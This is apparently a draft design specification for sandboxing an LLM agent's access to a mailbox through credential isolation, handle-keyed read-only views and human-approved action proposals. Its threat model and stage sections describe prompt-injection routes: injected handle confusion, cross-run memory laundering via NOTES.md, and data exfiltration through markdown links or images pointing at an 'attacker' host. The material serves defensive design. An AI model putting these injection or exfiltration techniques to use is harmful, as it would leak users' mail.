# TriOnyx Mail Subsystem — Design Specification

**Status:** draft v0.2 · consolidating design discussion
**Scope:** agent access to mail, with credential isolation and human-gated mutation

> **Update (2026-08-04).** Since this draft was written, TriOnyx replaced the
> FUSE driver with per-agent git repositories and kernel bind mounts. This
> changes some of the spec's assumptions: agent-visible mounts are now literal
> git-repo bind mounts (the agent's own repo read-write at `/workspace`, shared
> repos at `/repos/<name>` via `repos_read`/`repos_write`), and the
> `/agents/<name>/**` FUSE default write path injected by
> `Sandbox.build_fuse_policy/1` no longer exists — an agent's memory files
> live directly in its own repo (e.g. `/workspace/NOTES.md`). References in
> this document to the FUSE view daemon, `fs_read`/`fs_write` fields, and the
> FUSE D-state hazard describe the retired mechanism; the body is left
> unedited as the design record.

> **Changes in v0.2.** Added §14, mapping the design onto what TriOnyx runs
> today and recording two invariant violations that exist in the current
> implementation. Resolved §13.1 (materialization cost) by arithmetic rather
> than deferring it. Corrected the view permission model (§6.2), tightened the
> handle security claim (§5), added thread expansion to view construction
> (§6.1, §11.4), qualified the per-message process cost claim (§7.4), promoted
> the fd-inheritance transport problem from open question to requirement (§4,
> §13.4), reordered §7.5 to lead with parser containment, and reclassified
> cross-run laundering (§3, §13.3) from a risk this design avoids to one it
> must close.

---

## 1. Purpose

Give an LLM agent useful access to a mailbox without giving it the mailbox.

Concretely: the agent should be able to triage, extract, and draft, while the
system guarantees by construction — not by policy evaluation — that it cannot
read outside its assigned scope, cannot destroy mail, and cannot send without
approval.

The design target is a system where the security properties are **topological
facts** rather than assertions checked at runtime. "The agent cannot delete mail
from the server" should be true because no code path exists, not because a rule
denied it.

---

## 2. Invariants

These are load-bearing. Every design decision below traces to one of them.

**I1 — Credential isolation.**
Credentials live in exactly one process. That process never parses
attacker-influenced input. No process the agent can reach holds, or can reach, a
credential.

**I2 — Scope is fixed at spawn.**
An agent's readable scope is determined before it starts and cannot widen during
a run. There is no runtime policy evaluation on the read path.

**I3 — Single channel per boundary.**
No pair of coupled channels with shared lifecycle. Either one channel, or two
fully independent planes joined only by durable identity.

**I4 — Unix-composable.**
Standard tools (`grep`, `find`, `jq`, `xargs`, `mblaze`, `notmuch`) work against
agent-visible surfaces without adaptation.

**I5 — Backend-agnostic.**
IMAP is the first backend, not the model. Protocol specifics are confined to
adapters.

**I6 — Effects are proposals.**
The agent never mutates remote state. It proposes; a privileged component
applies.

**I1 and the cross-run corollary of I2 are both violated by the implementation
running today.** See §14.

---

## 3. Threat model

**Primary adversary: message content.** Any message body, header, filename, or
attachment is attacker-controlled and reaches a model. Prompt injection is
assumed to succeed; the design bounds its consequences rather than preventing it.

**Secondary: agent implementation bugs.** The agent is assumed to be capable of
issuing arbitrary syscalls within its sandbox.

**Explicitly out of scope:**

- Malicious compute host. (Considered and rejected — see §12.5.)
- Model output *correctness*. Containment bounds actions, not truthfulness.
  A hallucinated or injected summary that causes a human to act wrongly is not
  addressed by any mechanism here. Mitigated only by §7.6 grounding checks and
  by keeping source references attached to derived claims.

**Known residual risks:**

- The human as an exfiltration channel — an approval UI rendering an
  attacker-crafted URL that a human clicks.
- **Cross-run laundering via persistent agent-writable state. This is an open
  channel in the current system, not a hypothetical.** The email agent appends
  to `/agents/email/NOTES.md` and re-reads it at the start of every session;
  the news agent does the same with `PREFERENCES.md`. Mail content therefore
  reaches the next run's instructions. See §13.3 and §14.3.
- Free-text fields in inter-stage schemas passing injection through
  a boundary intended to constrain it (§7.5).

---

## 4. Process topology

```
  ┌──────────┐   fd3/JSONL   ┌───────────┐   protocol   ┌────────┐
  │ adapter  │◄─────────────►│supervisor │              │ server │
  │ creds,net│               │  trusted  │              └────────┘
  └────┬─────┘               └─────┬─────┘                   ▲
       │ writes                    │ spawns                  │
       ▼                           ▼                         │
  ┌──────────┐             ┌───────────────┐                 │
  │local store│───────────►│  view daemon  │                 │
  │ (maildir) │  projects  │ FUSE, read-only│                │
  └──────────┘             └───────┬───────┘                 │
                                   │ mounts                  │
                            ┌──────▼──────┐                   │
                            │   stages    │                   │
                            │ untrusted   │                   │
                            └──────┬──────┘                   │
                                   │ writes                   │
                            ┌──────▼──────┐    ┌──────────┐   │
                            │    spool    │───►│ applier  │───┘
                            └─────────────┘    └──────────┘
```

**Credential holder:** adapter only. Both the supervisor (to sync) and the
applier (to mutate) reach the server *through* the adapter. Nothing else has
network egress to the mail host.

**Spawn direction is load-bearing.** The supervisor spawns everything. Stages
never spawn the adapter. Under a shared uid, a parent can `ptrace` its child and
read its memory — so a design where the agent host spawns the credentialed
process (MCP's model) provides no isolation. Each component runs as a distinct
uid.

**No sockets.** All inter-process communication is over inherited file
descriptors. The fd *is* the capability: there is no path to guess and no
ambient authority. Per-run scoping requires no token, because the pipe is the
token.

### 4.1 Fd inheritance does not cross a container boundary

The fd-as-capability property holds only while every component is a process on
one host, in one pid namespace lineage. TriOnyx spawns agents by opening a Port
on the `docker` binary (`lib/tri_onyx/agent_port.ex:672`). Fds inherited by that
Port land in the `docker` CLI process on the host — they do not appear inside
the container. The same is true of any deployment where a stage runs in a VM or
over ssh.

**This is a requirement, not an open question.** Containerized stages are the
default deployment shape for TriOnyx, so the design must name a transport that
preserves capability semantics across that boundary from the start. 9p is the
likely answer — filesystem semantics over a single byte stream, already the
mechanism behind virtio-9p and virtiofs — with fd inheritance retained as the
fast path where components genuinely share a host. See §13.4 and §14.2.

**Local store, not live network.** The view is backed by locally synced mail, not
a live connection. This avoids the FUSE D-state hazard, where a daemon blocking
on network makes every process touching the mount uninterruptible and immune to
`kill -9`.

---

## 5. Handles

A handle is an opaque, per-run identifier minted by the supervisor:
`h_<128-bit random, base32>`.

The supervisor holds the mapping to backend identity — `(folder, UIDVALIDITY,
UID)` for IMAP, `Email/id` for JMAP, message id for Gmail API, path for Maildir.
Nothing downstream of the supervisor ever sees backend identity.

Handles do two jobs:

**Security.** The agent cannot construct a reference to a message outside its
view. An injected instruction naming a Message-ID has nothing to bind to. This
converts a class of injection from "possible, hopefully caught" to "not
expressible."

State the guarantee precisely, because the weaker form is what usually holds:
the property is **cannot reference outside the view**, not *cannot reference
outside what it was shown*. Any stage that reads `manifest` holds every handle
in scope, and an injection inside one message can name another. The stronger
property requires that the stage never see the manifest — which is what §7.4's
per-message namespace delivers, and why that pattern is preferred rather than
merely tidy.

**Portability.** Handles are the backend abstraction seam. Backend identity
churn (UIDVALIDITY invalidation, id format differences) is the supervisor's
problem, not a correctness bug in every downstream component.

Handles are stable for the lifetime of a run and are not reused across runs.

---

## 6. The view

The view is a read-only filesystem materialized once per run, before any stage
starts.

**The mount is the ACL.** There is no read-path policy engine. A message is
present in the namespace or it is not. Nothing to evaluate, nothing to bypass,
no rule-combination semantics to get wrong.

### 6.1 Construction

The supervisor evaluates the run's `view.query` against the local store, using
credentials, before the agent exists. Query terms include collection membership,
date range, tags, and DKIM-verified sender identity.

DKIM verification happens here, once, as a query term — not as a per-access
policy predicate. Note that `From:` is unauthenticated and must never be used as
a trust signal; only DKIM-aligned identity may appear in a query, and
verification failure is a distinct state that cannot satisfy an allowlist.

**Thread expansion is a view-construction operation.** Any run that drafts
replies needs the conversation, and the conversation is routinely older than the
run's date window. Resolving that inside a stage would require whole-set
visibility and cross-run state (§13.3); resolving it here does not, because the
supervisor is already credentialed, already holds backend identity, and already
runs before the agent exists.

`view.expand: thread` pulls the full thread for every matched message. `limit`
applies to matched roots, not to the expanded set — otherwise a single long
thread silently evicts the rest of the scope. Expanded messages are minted
handles like any other and are indistinguishable downstream; the widening
happens strictly before spawn, so I2 holds.

### 6.2 Layout

```
/run/trionyx/<run>.<pid>/
├── mail/                 # mode 0111 — traversable, not listable
│   ├── h_7f3a1c9e/       # mode 0555
│   │   ├── envelope.json
│   │   ├── body.txt
│   │   └── attachments/
│   │       └── faktura.pdf
│   └── h_2b8d40f1/
│       └── ...
├── manifest              # newline-separated handles, supervisor-written
├── <input dirs>          # read-only, from prior stages
├── <output dir>          # the stage's only writable path
└── spool/                # present only if the stage may propose
```

Read granularity is expressed as **which files exist**, not as permissions.
A stage granted `project: [envelope]` gets a tree with no `body.txt` — not
filtered, not materialized.

**The non-enumerability permission belongs on `mail/`, not on the handle
directories.** `mail/` is mode `0111`: search permission resolves a known name
without granting the directory read that `ls` requires, so a stage can reach a
message whose handle it holds and cannot enumerate the rest. Handle directories
themselves are `0555` — a stage that legitimately holds a handle must be able to
list it, because attachment filenames are not predictable and `attachments/`
would otherwise be unreachable. Putting `0111` on the handle directory breaks
the attachment path while adding nothing: a stage that can traverse into
`h_7f3a1c9e/` has already proven it knows the handle.

Where a stage should see the full set, it reads `manifest`. Withholding
`manifest` is what upgrades the §5 guarantee from *cannot reference outside the
view* to *cannot reference outside what it was shown*.

### 6.3 Cost model

Materialization is a hardlink farm, and it is cheap enough at every realistic
scope that the read-path policy layer can be deleted outright rather than
traded against. See §13.1 for the arithmetic.

---

## 7. Stages

A stage is a privilege boundary: one process, one principal, one mount
namespace. Stages run in sequence and share nothing but directories passed
forward.

### 7.1 Contract

The supervisor guarantees a stage exactly four things:

1. Zero or more read-only input directories
2. Exactly one writable output directory
3. A capability set (intersection of requested and granted)
4. An opaque configuration blob

The supervisor does not parse the configuration blob. This is what decouples
stage types from the supervisor: adding a stage type requires no supervisor
change, because the supervisor never understood any stage's config in the first
place.

### 7.2 Manifest

Ships with the implementation, declares only shape:

```yaml
# /usr/lib/trionyx/stages/grounding-check.yaml
stage: grounding-check
version: 1
exec: /usr/lib/trionyx/bin/grounding-check
inputs:
  records: {keyed: handle, format: json}
  source:  {keyed: handle, format: mail}
outputs:
  out:     {keyed: handle, format: json}
capabilities: []
config_schema: ./config.schema.json
```

Because ports declare `{keyed, format}`, the supervisor can typecheck a pipeline
at load — output format matches next input format, keying is consistent, no
dangling ports — while understanding none of the payloads.

### 7.3 Capabilities

A manifest's `capabilities` list is a **request**, not a grant. The effective set
is `requested ∩ run-granted ∩ site-granted`, default deny. A third-party stage
cannot grant itself network access.

Capability values: `net:<host>`, `exec`, `spool`, `bulk-read`.

### 7.4 Keying

Filename is the handle, throughout:

```
mail/h_7f3a1c9e/          stage 1 reads
records/h_7f3a1c9e.json   stage 1 emits
clean/h_7f3a1c9e.json     validator emits
spool/h_7f3a1c9e.0.json   proposal
```

The join is `ls`. Coverage is `comm -23 manifest <(ls records/ | sed s/.json//)`.
Resumption is skip-if-exists.

**The binding must come from the filesystem, not from record content.** A
`handle` field inside a JSON record is attacker-reachable: a message can instruct
the extractor to emit a record naming a different handle. Therefore:

- The output directory accepts writes only at paths matching handles in scope.
- Downstream stages derive the handle from the path and discard any internal
  `handle` field.
- **Preferred:** spawn one extractor per message, with exactly one message
  directory and one writable path in its namespace, and no `manifest`. Handle
  confusion is then unnameable rather than merely validated against, and the §5
  guarantee reaches its strong form. It also yields natural parallelism and
  per-message timeouts.

Writes are tmp + `rename()` so a reader never sees a partial file. One file per
handle; an array if a message yields several records.

**The cost of per-message isolation depends entirely on the isolation unit, and
the naive claim does not survive containers.** One `fork`+`exec` is ~1 ms —
genuine noise next to 8B inference, and the reason this pattern is preferred.
One container is 0.5–1 s, which at a 500-message scope is 4–8 minutes of pure
overhead before any work happens. Since TriOnyx's current isolation unit is a
container (§14.2), per-message isolation needs a cheaper unit — a `unshare`d
mount namespace per message inside one long-lived stage container is the
obvious candidate — or the run falls back to per-run isolation with the
path-derived-handle validation above as the weaker guarantee. Choosing the unit
is a prerequisite for §7.4's preferred form, not an implementation detail.

### 7.5 Stage types

Stages are not necessarily models. Known useful types:

| type | actor | purpose |
|---|---|---|
| `extract` | small model | raw content → structured records |
| `schema-validate` | deterministic | strict schema, length caps, Unicode normalization |
| `grounding-check` | deterministic | verify claimed values appear in source |
| `pseudonymize` | deterministic | entities → stable placeholders |
| `rehydrate` | deterministic | placeholders → entities (holds the mapping) |
| `classify` | small model | filter: emits fewer records than it reads |
| `parse-attachment` | deterministic | contains PDF/HTML/archive parsers |
| `reason` | large model | operates on validated structure |
| `draft-lint` | deterministic | recipient allowlist, URL inertization, attachment rules |

Three of these deserve comment.

**Parser containment — the strongest case for the stage mechanism.** PDF, HTML,
and archive parsers are the worst memory-safety surface in a mail pipeline. As a
stage — one message, no network, seccomp, timeout — a parser RCE buys the
attacker a process containing one message and one writable path. The containment
is *total* rather than bandwidth-limiting, which makes this a better
justification for stages than tiering: it converts arbitrary code execution into
a bounded loss, where tiering only narrows a channel.

**Tiering.** "The small model sees bodies, the large one doesn't" is true only
because they are separate processes with separate namespaces. Inside one process
it is a promise; across a stage boundary it is a mount table.

The security value of a tier is proportional to how constrained the emitted
schema is. `{vendor, amount, date, invoice_no}` with typed fields leaves an
injection almost nowhere to survive. A `summary: string` field passes it through
verbatim. **Every free-text field costs some of what the boundary bought.**

**The pseudonymize/rehydrate bracket.** The expensive model reasons over
`VENDOR_1` and `AMOUNT_3`; the rehydrator holds the mapping and is the only
component that sees both sides. Placeholders that fail to round-trip are a hard
error, which incidentally catches invented entities. This delivers what
homomorphic encryption was reaching for, using two small deterministic programs.

### 7.6 Output-side stages

Untrusted output deserves the same boundary as untrusted input. Draft linting —
recipient allowlist, URL inertization, no forwarded attachments, Unicode
normalization — belongs in a deterministic stage the model cannot influence, not
as a property the model is asked to respect.

On the display format: charset restriction addresses invisible characters
(zero-width, bidi overrides, tag block U+E0000–E007F, variation selectors) but
not the primary channel. `[text](https://attacker/?d=…)` is pure ASCII, and an
image reference is auto-fetching egress requiring no click. The rule is **no
auto-fetch, no divergence between displayed text and target, URLs shown inert
and in full** — which means not emitting markdown for untrusted content.

Normalize rather than restrict: NFC, drop Unicode category Cf plus bidi controls
and tag block, keep letters and marks, flag mixed-script tokens per UTS #39.
ASCII-only would mangle Norwegian content.

Retain raw bytes alongside the normalized form. Stripping is lossy, and the
original may matter as evidence.

---

## 8. The spool

The agent's only write path. Append-only JSONL, one file per proposal:

```json
{"op":"collection.add","handle":"h_7f3a1c9e","to":"Kvitteringer","nonce":"01JR8W…"}
```

The spool is simultaneously the queue, the audit log, and the approval UI. Every
Unix tool works on it directly.

### 8.1 Applier

Runs credentialed, drains the spool, applies through the adapter.

- Proposals matching `apply.auto` are applied immediately.
- Proposals matching `apply.deny` are rejected at ingest.
- Everything else moves to `pending/` for human approval.

There is no third mode visible to the agent. "Draft-only send" is an empty
`auto` list, not a feature.

Idempotency via nonce. Staleness handling: apply only if the message is still at
the expected location, else reject — another client may have moved it.

Batching is inherent: forty archive proposals are one approval, not forty. This
is a material improvement over the synchronous per-call approval the current
system uses (§14.4), where the agent blocks on each mutation individually.

### 8.2 Verbs

Canonical, backend-independent:

| verb | notes |
|---|---|
| `collection.add` | destination allowlist |
| `collection.remove` | gate if removing the last collection |
| `flag.add` / `flag.remove` | |
| `trash` | distinct from `collection.remove` |
| `expunge` | typically denied outright |
| `draft` | writes to Drafts, no transmission |
| `send` | separate verb, separate approval |

**Move is not a primitive.** Under the collection model it decomposes into add
plus remove, which have different risk profiles. It is also a read-escalation
vector: an agent that can move a message out of an unreadable collection into a
readable one bypasses scope in two steps. Since scope is fixed at view
materialization (§6), this is closed by construction — the agent cannot name a
message outside its view — but the decomposition should be preserved so the
property survives any future relaxation.

---

## 9. Backend adapters

An adapter is an executable speaking the adapter protocol on fd 3. It holds one
credential, has egress to one host, and is separately sandboxable.

### 9.1 Canonical model

**Collections, not folders.** IMAP and Exchange are one-folder-per-message; JMAP,
Gmail, and notmuch permit many. Model on the superset and let IMAP be the
constrained adapter — the reverse loses expressiveness that cannot be recovered.

Under FUSE, many-to-many maps onto hardlinks: three collections, three links,
`nlink=3`.

### 9.2 Capability descriptor

Adapters declare, and the supervisor refuses pipelines requiring capabilities the
backend lacks:

```
multi_collection    bool
server_search       bool
atomic_move         bool
push                bool
id_stability        stable | validity_scoped | positional
credential_scopable bool
```

**Degradation must be explicit.** Silently converting `collection.add` into a
move on IMAP is how a pipeline behaves correctly against a Maildir in dev and
destructively against Exchange in production. Unsupported operations are refused.

### 9.3 Sync cursors

Opaque. IMAP has `HIGHESTMODSEQ`, JMAP has state strings, Gmail has `historyId`,
Maildir has mtimes. The supervisor stores the blob and returns it; it must never
parse it.

### 9.4 Send asymmetry

Transmission is a separate transport per backend: SMTP for IMAP,
`EmailSubmission` for JMAP, an API method for Gmail. Credential separation is
nearly free with IMAP+SMTP, unavailable with JMAP (one session does everything),
and available with Gmail only via OAuth scope.

Where `credential_scopable` is false, "cannot send" must be enforced by shipping
a read-only adapter binary that lacks the code path — not by configuration.

### 9.5 Reference implementation

**Maildir adapter first.** It has no credential at all, which makes the entire
stage machinery and pipeline typechecking testable without any secret existing
anywhere. It also forces the capability descriptor to be real from day one rather
than retrofitted when the second backend arrives.

In TriOnyx specifically this is unusually cheap and unusually valuable: it
decouples the whole redesign from the live mailbox, so the new topology can be
built and tested to completion before anything touches the running IMAP account
(§14.5).

---

## 10. Wire protocol

Newline-delimited JSON on **fd 3**, leaving stdout and stderr conventional. This
avoids the most common failure mode in stdio protocols: a linked library printing
a warning to stdout and corrupting the frame stream.

Bulk content does not cross the wire. Message bodies and attachments are read
from the view; the protocol carries handles and structured records only. Where
bulk transfer is unavoidable, chunked base64 with bounded frames:

```json
{"id":"r7","type":"blob","seq":0,"final":false,"data":"…"}
```

64 KB chunks keep lines under ~87 KB, bounding allocation while keeping every
line valid JSON. The encode/decode cost is negligible; **unbounded frames are the
actual hazard.** Any transfer over a few hundred KB is a design smell indicating
work that belongs on the supervisor side.

Where a boundary is crossed that fd 3 cannot reach (§4.1), the framing is
unchanged — only the carrier differs.

---

## 11. Configuration

Two files. Stage manifests (§7.2) ship with implementations; runs only wire.

### 11.1 Site actors

```yaml
# /etc/trionyx/actors.yaml
extractor: {exec: "llama-server --model qwen3-8b", net: none}
reasoner:  {exec: trionyx-llm, net: [api.anthropic.com]}
```

Actors are roles. Swapping the small model is a site-config edit, not a change to
every run.

### 11.2 Example: receipt triage

```yaml
run:
  name: kvittering-triage
  backend: maildir
  when: "daily 07:00"

view:
  query: "collection:INBOX and date:14d.. and not tag:triaged"
  limit: 500

pipeline:
  - uses: extract@1
    actor: extractor
    in:   {mail: {from: view, project: [envelope, body]}}
    with: {schema: kvittering}

  - uses: grounding-check@1

  - uses: reason@1
    actor: reasoner
    in:   {records: {from: grounding-check.out}}
    spool: true

apply:
  auto:
    - "collection.add -> Kvitteringer"
    - "collection.remove -> INBOX"
    - "flag.add -> seen"
  rate: 200/h
  deny: [expunge, trash, send]
```

The `reason` stage has no `mail` input at all — its entire input is validated
structure.

### 11.3 Example: digest, no write path

```yaml
run:
  name: deal-digest
  backend: maildir
  when: "daily 06:00"

view:
  query: "collection:Nyhetsbrev and date:1d.."

pipeline:
  - uses: extract@1
    actor: extractor
    in:   {mail: {from: view, project: [envelope, body]}}

  - uses: reason@1
    actor: reasoner
    in:   {records: {from: extract.out}}
    output: /var/lib/trionyx/digest/%d.md

# no apply block, no spool: mutation is unexpressible
```

### 11.4 Example: drafting, nothing auto-applies

```yaml
run:
  name: korrespondanse
  backend: imap-work
  when: manual

view:
  query: "collection:INBOX and dkim:ge.com and date:7d.."
  expand: thread      # full conversation for each match; see §6.1
  limit: 50           # applies to matched roots, not the expanded set

pipeline:
  - uses: reason@1
    actor: reasoner
    in:   {mail: {from: view, project: [envelope, body]}}
    spool: true

  - uses: draft-lint@1
    with: {rules: [recipient-allowlist, urls-inert, no-forwarded-attachments]}

apply:
  auto: []
  deny: [expunge, trash, collection.remove]
```

`expand: thread` is load-bearing here rather than a convenience. Without it the
view contains a reply whose conversation is older than the date window, and the
stage would need whole-set visibility to reconstruct it — which is the deferred
primitive in §13.3. Resolving threads at view construction keeps this run inside
the design instead of requiring the deferred piece.

### 11.5 YAML hazards

Given that these files control security properties:

- **Indentation is load-bearing.** A mis-indented `deny:` becomes a child of
  `auto:` and the denylist silently becomes an allowlist. Validate against JSON
  Schema at load, fail closed on unknown keys, and print the parsed structure at
  startup so a misparse is visible rather than latent.
- **`safe_load` only.** Never a loader honouring type tags.
- **The Norway problem, literally.** YAML 1.1 parsers read bare `no`, `on`,
  `off`, `y`, `n` as booleans. Quote all collection names and tags
  unconditionally.

---

## 12. Rejected alternatives

Recorded with rationale, because the reasoning is the reusable part.

### 12.1 IMAP ACLs (RFC 4314)

Wrong axis. ACLs are `(identity × folder) → static rights`. Agent policy wants
`(session × action × object × context) → decision`. Inexpressible: age limits,
headers-but-not-bodies, destination-conditional moves, rate limits, per-task
narrowing. Also requires owning the server, and denial surfaces as an opaque
tagged `NO` — the worst possible signal for a model, which then retries and
rephrases.

### 12.2 IMAP proxy

Requires a full tokenizer, because literals (`{1234}`, `{1234+}`) mean naive line
filtering permits command injection via message bodies. Requires CAPABILITY
rewriting or clients attempt commands that are then rejected. Filtering messages
from responses desynchronizes client sequence numbering. Places a live parser
adjacent to credentials permanently, violating I1.

### 12.3 Wrapping existing CLIs

Viable and was the basis for the read plane, but insufficient alone: every such
tool is a full-capability client. Config files are inside the trust boundary
(`auth.cmd` executes shell commands; notmuch hooks execute on `new`). Value came
from process isolation, which the stage mechanism generalizes.

### 12.4 Runtime policy language

A five-dimensional `actor × verb × source × target → mode` matrix required a
relational constraint bolted on to prevent read-from-confidential →
send-to-external, and a schema-level restriction preventing sender predicates
from appearing as standalone grants. Both are symptoms of a language expressive
enough to express its own bugs. Replaced by §6: scope fixed at spawn, mount is
the ACL.

### 12.5 Homomorphic encryption

Does not address the threat model. FHE is semantics-preserving by construction —
the injected instruction is encrypted too, processed identically, producing an
encrypted request to exfiltrate. The model must understand the message to
summarize it; if it understands it, the injection lands.

Separately: effects are plaintext. Something must decrypt to issue an IMAP
command, and that component sees everything. FHE would protect the one segment
already on local disk under a local uid.

Performance is also prohibitive — encrypted transformer inference remains
research-scale, fighting memory explosion in encrypted activations, with
CPU overheads around 10⁴. Headline latency claims generally encrypt a subset of
operations and run the remainder in the clear.

Where the intuition was right: crypto works on the *index* layer (searchable
symmetric encryption, PIR), not the reasoning layer. Confidential computing
(SEV-SNP, TDX, H100 CC mode) is the deployable answer to untrusted compute, at
single-digit percent overhead and a weaker threat model.

### 12.6 Two coupled channels for bulk transfer

Lifecycle ownership, shared mount namespace that can never be dropped, and
partial-failure states where a control message references an already-reaped blob.
The FUSE view is not this: it is a persistent independent plane joined only by
handles, with no cleanup ownership question. If the mount dies, actions still
work; if the pipe dies, reads still work.

---

## 13. Open questions

### 13.1 Materialization cost — resolved, materialization wins

Previously held as the question that decides the architecture. It does not, and
the arithmetic is not close enough to justify measuring before proceeding.

`link()` on a warm dentry cache costs roughly 5–20 µs. Against that:

| scope | links | materialization |
|---|---|---|
| 500 (§11.2's `limit`) | ~1.5k | under 10 ms |
| 10,000 | ~30k | ~150 ms |
| 100,000 | ~300k | 1.5–3 s |

The largest column is an order of magnitude beyond any scope a mail agent
plausibly operates on, is paid once per run, and is still negligible against a
run that spends minutes in inference. There is no crossover at which dynamic
policy evaluation earns back its complexity, so the read-path policy layer is
deleted rather than traded against.

Two costs are worth a benchmark later, neither of which is architectural: cold
dentry cache on a large first sync, and inode pressure on filesystems with
per-directory link limits (ext4's 65,000-subdirectory ceiling bounds a single
flat `mail/` directory, so shard by handle prefix above ~50k messages).

### 13.2 Collection change: local or upstream

Whether `collection.add` is a local view change (notmuch-style tags, reconciled
upstream in batch) or a direct upstream write. Tags-plus-reconciler gives most of
the triage value with the destructive path touched only in batch, under one
approval, and is a materially smaller system.

### 13.3 Cross-run state — a channel to close, not one to avoid

Dedup, threading, and cross-run diffing need to see whole sets, so they cannot be
handle-keyed and cannot use set-difference for coverage. They are a different
primitive.

More seriously, any persistent agent-writable store is an untrusted input to
every subsequent run. **This design does not get to defer the question on the
grounds of having no such store — TriOnyx has one already** (`NOTES.md`,
`PREFERENCES.md`; see §14.3). The question is therefore not "should we open this
channel" but "what replaces the channel that is open," and any answer has to
survive the fact that the existing agents depend on it for learned corrections.

Threading specifically is removed from this bucket by §6.1: resolved at view
construction by the credentialed supervisor, it needs no agent-writable state.

### 13.4 Transport reach — reframed as a requirement

FUSE is kernel-local, and fd inheritance does not cross a container boundary
(§4.1). Since containerized stages are TriOnyx's default rather than an
exotic deployment, this is a constraint on the design, not a question about it.
9p provides filesystem semantics over a single byte stream and crosses machine
boundaries — same Plan 9 lineage, already the mechanism behind virtio-9p and
virtiofs. Likely resolution: 9p for the shape, FUSE as a local convenience mount.

What remains open is narrower: whether the capability property survives 9p
intact, or whether crossing that boundary reintroduces a nameable endpoint that
needs a token after all.

### 13.5 Errno as a channel

`EACCES` from `mv` tells a model nothing, so it retries and burns context. The
Plan 9 `ctl` idiom — write a command, read back a structured result — is the
known fix, but must be built deliberately rather than inherited.

Note this matters less on the applier path than it looks: a stale-rejection
(§8.1) surfaces to a human, not to the model. It matters most where a stage
touches the view directly.

---

## 14. Current implementation and migration delta

This design is not greenfield. TriOnyx runs a degenerate version of the same
topology today, and the gap is small enough that the interesting content is the
delta rather than the target.

| spec component | today |
|---|---|
| adapter | `lib/tri_onyx/connectors/email.ex` — IMAP + SMTP credentials |
| supervisor | gateway: `AgentSupervisor`, `Sandbox`, `TriggerRouter` |
| view daemon | `fuse/` — `tri-onyx-fs` |
| stage | one agent container per session |
| spool + applier | `BCP.ApprovalQueue` + `SendEmail` / `MoveEmail` / `SaveDraft` |
| run config | `workspace/agent-definitions/email.md` frontmatter |

The pieces exist. What differs is that several of the properties the design
treats as topological are currently assertions.

### 14.1 I1 is violated: the credential process parses untrusted MIME

`email.ex` holds the SMTP and IMAP credentials *and* performs the MIME parse —
`parse_mime/1`, `extract_body/3`, `extract_attachments/1`,
`extract_filename_from_disposition/1`. Attacker-controlled bytes are parsed in
the same address space, in the same OS process, as the mailbox password.

BEAM memory safety makes this materially less dangerous than a C PDF parser
would be, and no concrete exploit is claimed. But the invariant as written says
the credential process *never* parses attacker-influenced input, and that is
simply not the case. Splitting the parse out — into a `parse-attachment`-shaped
stage (§7.5) or minimally a separate uid — is the first concrete migration step,
and it is independent of everything else in this document.

### 14.2 The isolation unit is a container, which breaks two mechanisms

Agents are spawned by `Port.open` on the `docker` binary
(`lib/tri_onyx/agent_port.ex:672`). Two consequences:

- **Fd inheritance does not reach the stage** (§4.1). The adapter protocol needs
  a carrier that crosses the container boundary.
- **Per-message isolation is unaffordable at container granularity** (§7.4).
  A cheaper unit is a prerequisite, not a refinement.

Both are solvable, but they are load-bearing choices that have to be made before
the stage mechanism is built, not discovered during it.

### 14.3 The laundering channel is already open

`Sandbox.build_fuse_policy/1` injects `/agents/<name>/**` as a default write
path for every agent — deliberately, so agents can maintain memory files. The
email agent's definition instructs it to append corrections to
`/agents/email/NOTES.md` and re-read that file at the start of every session.
Note that `fs_write` in `email.md` lists only `drafts/**`; the write access to
`NOTES.md` comes from the injected default, so the definition reads as more
restricted than it is.

The result is a durable path from message content to the next run's
instructions, which is precisely the cross-run laundering channel §13.3
describes. It is in production, it predates this design, and the agents rely on
it. Closing it is a requirement of the migration and needs a replacement for
learned corrections — plausibly a human-approved write, routed through the same
spool mechanism as any other mutation.

### 14.4 Approval is synchronous and unbatched

`SendEmail` blocks the agent until a human approves or rejects, one call at a
time. The spool model (§8) replaces this with async batch approval, which is a
real improvement: forty archive proposals become one decision, and the agent
does not hold a session open waiting on a human.

### 14.5 Suggested order

1. Maildir adapter (§9.5) — no credential exists, so the stage machinery and
   pipeline typechecking are testable in full isolation from the live mailbox.
2. Split MIME parsing out of the credential process (§14.1) — closes the I1
   violation, independent of the rest.
3. Choose the isolation unit and the container-crossing transport (§14.2) —
   both block the stage mechanism.
4. Materialized view replacing the policy-evaluating FUSE (§6).
5. Spool and applier replacing synchronous approval (§8).
6. Close the `NOTES.md` channel with an approved-write replacement (§14.3).

---

## Appendix A — Prior art

- **Plan 9 `upas/fs`** — mailbox as synthetic filesystem, messages as
  directories, actions via a control file. The read-via-namespace/act-via-ctl
  idiom is the direct ancestor of §6 and §13.5.
- **Maildir** — one file per message, flags in the filename suffix, atomic
  delivery via tmp + rename. The substrate, and the source of the atomicity
  property in §7.4.
- **mbsync `Sync Pull`** — direction-selective propagation. Makes "local damage
  cannot reach the server" a topology fact.
- **RFC 4314 ACLs** — rejected (§12.1), but the rights letters are a useful
  checklist of what a mail actor can actually do.
- **MCP stdio transport** — the wire shape, minus the spawn-direction error
  noted in §4.
